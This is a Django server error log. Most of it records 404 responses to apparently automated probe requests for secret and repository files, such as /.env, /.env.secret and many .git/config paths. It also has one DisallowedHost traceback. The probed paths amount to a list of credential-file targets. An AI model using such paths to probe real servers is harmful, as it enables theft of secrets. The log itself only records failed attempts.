Not Found: /integration/.git/config
Not Found: /core/config/.git/config
Not Found: /docker/.git/config
Not Found: /lib/js/.git/config
Not Found: /modules/utils/.git/config
Not Found: /client/.git/config
Not Found: /.env.save
Not Found: /.env.secret
Not Found: /data/config/.git/config
Not Found: /user_area/.git/config
Not Found: /modules/db/.git/config
Not Found: /.env
Not Found: /logs/archived/.git/config
Not Found: /modules/api/.git/config
Not Found: /data/.git/config
Not Found: /data/private/.git/config
Not Found: /dev/backup/.git/config
Invalid HTTP_HOST header: '192.168.14.21'. You may need to add '192.168.14.21' to ALLOWED_HOSTS.
Traceback (most recent call last):
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/core/handlers/exception.py", line 55, in inner
    response = get_response(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/utils/deprecation.py", line 133, in __call__
    response = self.process_request(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/middleware/common.py", line 48, in process_request
    host = request.get_host()
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/http/request.py", line 151, in get_host
    raise DisallowedHost(msg)
django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: '192.168.14.21'. You may need to add '192.168.14.21' to ALLOWED_HOSTS.
Bad Request: /
Not Found: /robots.txt
Not Found: /contact.html
Not Found: /robots.txt
